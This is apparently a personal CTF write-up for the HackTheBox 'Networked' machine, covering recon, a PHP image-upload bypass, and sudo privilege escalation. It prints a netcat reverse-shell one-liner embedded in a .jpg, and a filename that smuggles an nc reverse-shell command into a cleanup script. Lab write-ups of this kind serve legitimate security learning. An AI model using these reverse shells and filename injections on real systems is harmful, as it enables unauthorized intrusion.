# Networked
## HackTheBox
### 10.129.235.199

#### NMAP
   PORT   STATE SERVICE REASON         VERSION
 * 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
 * 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
    http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
    http-methods:
      Supported Methods: GET HEAD POST OPTIONS
    http-title: Site doesn't have a title (text/html; charset=UTF-8).

#### Port 80
> Hello mate, we're building the new FaceMash!
> Help by funding us and be the new Tyler&Cameron!
> Join us at the pool party this Sat to get a glimpse

Found in source:
`<!-- upload and gallery not yet linked -->` 

#### Directories
```
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.235.199
 🚀  Threads               │ 80
 📖  Wordlist              │ /SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 🦡  User-Agent            │ feroxbuster/2.3.2
 💾  Output File           │ dirs/initialDir.log
 💲  Extensions            │ [php, html, txt]
──────────────────────────────────────────────────
200        8l       40w      229c http://10.129.235.199/index.php
301        7l       20w      238c http://10.129.235.199/uploads
200       22l       88w     1302c http://10.129.235.199/photos.php
200        1l        1w        2c http://10.129.235.199/uploads/index.html
200        5l       13w      169c http://10.129.235.199/upload.php
200        0l        0w        0c http://10.129.235.199/lib.php
301        7l       20w      237c http://10.129.235.199/backup
```
 * File upload available at `http://10.129.235.199/upload.php` 
 * File directory at `http://10.129.235.199/backup/` with file `backup.tar`

#### '/backup/` with file `backup.tar`
`wget http://10.129.235.199/backup/backup.tar` - saved in `/files`

The following files were listed in backup:
```Console
-rw-r--r--  staff  10240 Jul  9  2019 backup.tar
-rw-r--r--  staff    229 Jul  9  2019 index.php
-rw-r--r--  staff   2001 Jul  2  2019 lib.php
-rw-r--r--  staff   1871 Jul  2  2019 photos.php
-rw-r--r--  staff   1331 Jul  2  2019 upload.php
```

Photos.php
 * Gives file directories:
   * /var/www/html/lib.php
   * /var/www/html/uploads/

Interesting code in `photos.php`:
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$ignored = array('.', '..', 'index.html');
$files = array();

$i = 1;
echo '<div class="tg-wrap"><table class="tg">'."\n";

foreach (scandir($path) as $file) {
  if (in_array($file, $ignored)) continue;
  $files[$file] = filemtime($path. '/' . $file);
}
```

From `photos.php`
```php
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
```
 * Requires files less than 60000 bytes = 60kb
 * Requires uploaded file to have one of the following extensions: '.jpg', '.png', '.gif', '.jpeg'

Bypass file size by injecting code into the image itself
`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.14.29 4242 >/tmp/f' > ProfileBlue.jpg`
 * Uploaded file to uploads
 * set up ncat listner to port 4242

**Note to self**
Remember the difference between using `>` and `>>`

 * shell achieved

#### User
 * User with no access to user. After some console setting adjustments
 * There is a user `guly` where the user flag is saved.
 * Found `check_attack.php` in the user's folder (copied and saved in `/files`
   * unfiltered command `rm` to remove unwanted files in the `/var/www/html/uploads/` path
   * create a file containing payload: command prepended with a ; to have guly execute `nc $IP 8888 -c bash`
   * command `touch '; nc <IP> 8888 -c bash`
   * After a bit of a wait, a connection was made.

user flag: `526*****************************`

#### Privesc as guly
Checked `sudo -l`
```Console
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```
  * saved this in `/files`

references file `/etc/sysconfig/network-scripts/ifcfg-guly`
Provide argument `bash` when it asks for name, run as `sudo`

```Console
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test bash
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag: `0a8*****************************`
